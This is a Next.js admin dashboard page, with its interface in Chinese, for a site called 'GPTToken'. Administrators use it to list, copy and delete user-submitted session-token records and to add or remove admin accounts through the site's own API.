'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';

interface Token {
    id: number;
    accountName: string;
    sessionData: string;
    accessToken: string | null;
    createdAt: string;
}

interface Admin {
    id: number;
    email: string;
    createdAt: string;
}

export default function AdminDashboard() {
    const [activeTab, setActiveTab] = useState<'tokens' | 'users'>('tokens');
    const [tokens, setTokens] = useState<Token[]>([]);
    const [admins, setAdmins] = useState<Admin[]>([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState('');
    const [copiedId, setCopiedId] = useState<number | null>(null);
    const [deletingId, setDeletingId] = useState<number | null>(null);
    const [deletingAdminId, setDeletingAdminId] = useState<number | null>(null);
    const [adminEmail, setAdminEmail] = useState('');
    const [showAddAdmin, setShowAddAdmin] = useState(false);
    const [newAdminEmail, setNewAdminEmail] = useState('');
    const [newAdminPassword, setNewAdminPassword] = useState('');
    const [addingAdmin, setAddingAdmin] = useState(false);
    const router = useRouter();

    const fetchTokens = useCallback(async () => {
        const token = localStorage.getItem('adminToken');

        if (!token) {
            router.push('/admin');
            return;
        }

        try {
            const response = await fetch('/api/tokens', {
                headers: {
                    'Authorization': `Bearer ${token}`,
                },
            });

            if (response.status === 401) {
                localStorage.removeItem('adminToken');
                localStorage.removeItem('adminEmail');
                router.push('/admin');
                return;
            }

            const data = await response.json();

            if (response.ok) {
                setTokens(data.tokens);
            } else {
                setError(data.error);
            }
        } catch {
            setError('获取数据失败');
        } finally {
            setLoading(false);
        }
    }, [router]);

    const fetchAdmins = useCallback(async () => {
        const token = localStorage.getItem('adminToken');
        if (!token) return;

        try {
            const response = await fetch('/api/admins', {
                headers: {
                    'Authorization': `Bearer ${token}`,
                },
            });

            const data = await response.json();

            if (response.ok) {
                setAdmins(data.admins);
            }
        } catch {
            // Ignore errors for admin fetch
        }
    }, []);

    useEffect(() => {
        const email = localStorage.getItem('adminEmail');
        if (email) setAdminEmail(email);
        fetchTokens();
        fetchAdmins();
    }, [fetchTokens, fetchAdmins]);

    const handleCopy = async (sessionData: string, id: number) => {
        try {
            await navigator.clipboard.writeText(sessionData);
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 2000);
        } catch {
            const textArea = document.createElement('textarea');
            textArea.value = sessionData;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 2000);
        }
    };

    const handleDelete = async (id: number) => {
        if (!confirm('确定要删除这条记录吗？')) {
            return;
        }

        const token = localStorage.getItem('adminToken');
        if (!token) return;

        setDeletingId(id);

        try {
            const response = await fetch(`/api/tokens?id=${id}`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${token}`,
                },
            });

            if (response.ok) {
                setTokens(tokens.filter(t => t.id !== id));
            } else {
                const data = await response.json();
                alert(data.error || '删除失败');
            }
        } catch {
            alert('删除失败，请稍后重试');
        } finally {
            setDeletingId(null);
        }
    };

    const handleDeleteAdmin = async (id: number) => {
        if (!confirm('确定要删除这个管理员吗？')) {
            return;
        }

        const token = localStorage.getItem('adminToken');
        if (!token) return;

        setDeletingAdminId(id);

        try {
            const response = await fetch(`/api/admins?id=${id}`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${token}`,
                },
            });

            const data = await response.json();

            if (response.ok) {
                setAdmins(admins.filter(a => a.id !== id));
            } else {
                alert(data.error || '删除失败');
            }
        } catch {
            alert('删除失败，请稍后重试');
        } finally {
            setDeletingAdminId(null);
        }
    };

    const handleAddAdmin = async (e: React.FormEvent) => {
        e.preventDefault();

        if (!newAdminEmail || !newAdminPassword) {
            alert('请填写邮箱和密码');
            return;
        }

        const token = localStorage.getItem('adminToken');
        if (!token) return;

        setAddingAdmin(true);

        try {
            const response = await fetch('/api/admins', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`,
                },
                body: JSON.stringify({ email: newAdminEmail, password: newAdminPassword }),
            });

            const data = await response.json();

            if (response.ok) {
                setAdmins([...admins, { ...data.admin, createdAt: new Date().toISOString() }]);
                setNewAdminEmail('');
                setNewAdminPassword('');
                setShowAddAdmin(false);
            } else {
                alert(data.error || '添加失败');
            }
        } catch {
            alert('添加失败，请稍后重试');
        } finally {
            setAddingAdmin(false);
        }
    };

    const handleLogout = () => {
        localStorage.removeItem('adminToken');
        localStorage.removeItem('adminEmail');
        router.push('/admin');
    };

    const formatDate = (dateStr: string) => {
        const date = new Date(dateStr);
        return date.toLocaleString('zh-CN', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
        });
    };

    if (loading) {
        return (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100vh' }}>
                <div className="spinner" style={{ width: '40px', height: '40px', borderWidth: '3px', borderTopColor: 'var(--primary)' }}></div>
            </div>
        );
    }

    return (
        <>
            <header className="header">
                <a href="/" className="logo" style={{ textDecoration: 'none' }}>
                    <div className="logo-icon">🔑</div>
                    <span>GPT<span style={{ color: 'var(--primary)' }}>Token</span></span>
                </a>
                <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                    <span style={{ fontSize: '14px', color: 'var(--text-secondary)' }}>
                        👤 {adminEmail}
                    </span>
                    <button onClick={handleLogout} className="btn btn-secondary" style={{ padding: '8px 16px', fontSize: '14px' }}>
                        退出登录
                    </button>
                </div>
            </header>

            <main className="page-container-wide">
                {/* Tab Navigation */}
                <div style={{ display: 'flex', gap: '8px', marginBottom: '24px', borderBottom: '2px solid var(--border)', paddingBottom: '0' }}>
                    <button
                        onClick={() => setActiveTab('tokens')}
                        style={{
                            padding: '12px 24px',
                            fontSize: '15px',
                            fontWeight: '600',
                            background: 'none',
                            border: 'none',
                            cursor: 'pointer',
                            color: activeTab === 'tokens' ? 'var(--primary)' : 'var(--text-secondary)',
                            borderBottom: activeTab === 'tokens' ? '3px solid var(--primary)' : '3px solid transparent',
                            marginBottom: '-2px',
                            transition: 'all 0.2s ease',
                        }}
                    >
                        📋 Token 记录
                    </button>
                    <button
                        onClick={() => setActiveTab('users')}
                        style={{
                            padding: '12px 24px',
                            fontSize: '15px',
                            fontWeight: '600',
                            background: 'none',
                            border: 'none',
                            cursor: 'pointer',
                            color: activeTab === 'users' ? 'var(--primary)' : 'var(--text-secondary)',
                            borderBottom: activeTab === 'users' ? '3px solid var(--primary)' : '3px solid transparent',
                            marginBottom: '-2px',
                            transition: 'all 0.2s ease',
                        }}
                    >
                        👥 用户管理
                    </button>
                </div>

                {activeTab === 'tokens' && (
                    <>
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '24px' }}>
                            <div>
                                <h1 style={{ fontSize: '24px', fontWeight: '700' }}>Token 提交记录</h1>
                                <p style={{ color: 'var(--text-secondary)', marginTop: '4px' }}>
                                    共 {tokens.length} 条记录
                                </p>
                            </div>
                            <button onClick={fetchTokens} className="btn btn-outline" style={{ padding: '10px 20px' }}>
                                🔄 刷新
                            </button>
                        </div>

                        {error && (
                            <div className="alert alert-error" style={{ marginBottom: '24px' }}>
                                {error}
                            </div>
                        )}

                        {tokens.length === 0 ? (
                            <div className="card" style={{ textAlign: 'center', padding: '60px 20px' }}>
                                <div style={{ fontSize: '48px', marginBottom: '16px' }}>📭</div>
                                <h3 style={{ fontSize: '18px', color: 'var(--text-secondary)' }}>暂无提交记录</h3>
                                <p style={{ color: 'var(--text-muted)', marginTop: '8px' }}>等待用户提交 Token</p>
                            </div>
                        ) : (
                            <div className="card" style={{ padding: '0', overflow: 'hidden' }}>
                                <div className="table-container">
                                    <table>
                                        <thead>
                                            <tr>
                                                <th style={{ width: '60px' }}>ID</th>
                                                <th style={{ width: '150px' }}>账号名称</th>
                                                <th style={{ width: '180px' }}>提交时间</th>
                                                <th>Session 数据</th>
                                                <th style={{ width: '200px', minWidth: '200px' }}>操作</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {tokens.map((token) => (
                                                <tr key={token.id}>
                                                    <td>
                                                        <span className="badge badge-primary">#{token.id}</span>
                                                    </td>
                                                    <td>
                                                        <strong>{token.accountName}</strong>
                                                    </td>
                                                    <td style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                                                        {formatDate(token.createdAt)}
                                                    </td>
                                                    <td className="session-data">
                                                        <div className="session-preview" title={token.sessionData}>
                                                            {token.sessionData.substring(0, 60)}...
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div style={{ display: 'flex', gap: '8px', flexWrap: 'nowrap' }}>
                                                            <button
                                                                onClick={() => handleCopy(token.sessionData, token.id)}
                                                                className={`copy-btn ${copiedId === token.id ? 'copied' : ''}`}
                                                            >
                                                                {copiedId === token.id ? '✓ 已复制' : '📋 复制'}
                                                            </button>
                                                            <button
                                                                onClick={() => handleDelete(token.id)}
                                                                className="copy-btn"
                                                                style={{
                                                                    background: deletingId === token.id ? 'var(--danger)' : undefined,
                                                                    color: deletingId === token.id ? 'white' : 'var(--danger)',
                                                                    borderColor: 'var(--danger)'
                                                                }}
                                                                disabled={deletingId === token.id}
                                                            >
                                                                {deletingId === token.id ? '删除中...' : '🗑️ 删除'}
                                                            </button>
                                                        </div>
                                                    </td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        )}

                        <div className="alert alert-warning" style={{ marginTop: '24px' }}>
                            <span style={{ fontSize: '20px' }}>💡</span>
                            <div>
                                <strong>提示</strong>
                                <p style={{ marginTop: '4px', fontSize: '13px' }}>
                                    点击「复制」按钮可复制完整的 Session JSON 数据，数据将原样复制，不会有任何修改。
                                </p>
                            </div>
                        </div>
                    </>
                )}

                {activeTab === 'users' && (
                    <>
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '24px' }}>
                            <div>
                                <h1 style={{ fontSize: '24px', fontWeight: '700' }}>管理员用户</h1>
                                <p style={{ color: 'var(--text-secondary)', marginTop: '4px' }}>
                                    共 {admins.length} 个管理员
                                </p>
                            </div>
                            <button
                                onClick={() => setShowAddAdmin(!showAddAdmin)}
                                className="btn btn-primary"
                                style={{ padding: '10px 20px' }}
                            >
                                ➕ 添加管理员
                            </button>
                        </div>

                        {showAddAdmin && (
                            <div className="card" style={{ marginBottom: '24px' }}>
                                <h3 style={{ marginBottom: '16px', fontSize: '16px' }}>添加新管理员</h3>
                                <form onSubmit={handleAddAdmin}>
                                    <div style={{ display: 'flex', gap: '12px', alignItems: 'flex-end', flexWrap: 'wrap' }}>
                                        <div className="input-group" style={{ marginBottom: 0, flex: '1', minWidth: '200px' }}>
                                            <label className="input-label">邮箱</label>
                                            <input
                                                type="email"
                                                className="input-field"
                                                placeholder="admin@example.com"
                                                value={newAdminEmail}
                                                onChange={(e) => setNewAdminEmail(e.target.value)}
                                            />
                                        </div>
                                        <div className="input-group" style={{ marginBottom: 0, flex: '1', minWidth: '200px' }}>
                                            <label className="input-label">密码</label>
                                            <input
                                                type="password"
                                                className="input-field"
                                                placeholder="设置密码"
                                                value={newAdminPassword}
                                                onChange={(e) => setNewAdminPassword(e.target.value)}
                                            />
                                        </div>
                                        <button
                                            type="submit"
                                            className="btn btn-primary"
                                            disabled={addingAdmin}
                                            style={{ height: '50px' }}
                                        >
                                            {addingAdmin ? '添加中...' : '确认添加'}
                                        </button>
                                        <button
                                            type="button"
                                            onClick={() => setShowAddAdmin(false)}
                                            className="btn btn-secondary"
                                            style={{ height: '50px' }}
                                        >
                                            取消
                                        </button>
                                    </div>
                                </form>
                            </div>
                        )}

                        <div className="card" style={{ padding: '0', overflow: 'hidden' }}>
                            <div className="table-container">
                                <table>
                                    <thead>
                                        <tr>
                                            <th style={{ width: '60px' }}>ID</th>
                                            <th>邮箱</th>
                                            <th style={{ width: '180px' }}>创建时间</th>
                                            <th style={{ width: '120px' }}>操作</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {admins.map((admin) => (
                                            <tr key={admin.id}>
                                                <td>
                                                    <span className="badge badge-primary">#{admin.id}</span>
                                                </td>
                                                <td>
                                                    <strong>{admin.email}</strong>
                                                    {admin.email === adminEmail && (
                                                        <span className="badge badge-success" style={{ marginLeft: '8px' }}>当前</span>
                                                    )}
                                                </td>
                                                <td style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                                                    {formatDate(admin.createdAt)}
                                                </td>
                                                <td>
                                                    {admin.email !== adminEmail ? (
                                                        <button
                                                            onClick={() => handleDeleteAdmin(admin.id)}
                                                            className="copy-btn"
                                                            style={{
                                                                background: deletingAdminId === admin.id ? 'var(--danger)' : undefined,
                                                                color: deletingAdminId === admin.id ? 'white' : 'var(--danger)',
                                                                borderColor: 'var(--danger)'
                                                            }}
                                                            disabled={deletingAdminId === admin.id}
                                                        >
                                                            {deletingAdminId === admin.id ? '删除中...' : '🗑️ 删除'}
                                                        </button>
                                                    ) : (
                                                        <span style={{ color: 'var(--text-muted)', fontSize: '13px' }}>-</span>
                                                    )}
                                                </td>
                                            </tr>
                                        ))}
                                    </tbody>
                                </table>
                            </div>
                        </div>

                        <div className="alert alert-warning" style={{ marginTop: '24px' }}>
                            <span style={{ fontSize: '20px' }}>⚠️</span>
                            <div>
                                <strong>注意</strong>
                                <p style={{ marginTop: '4px', fontSize: '13px' }}>
                                    删除管理员后无法恢复，请谨慎操作。不能删除当前登录的账号。
                                </p>
                            </div>
                        </div>
                    </>
                )}
            </main>
        </>
    );
}
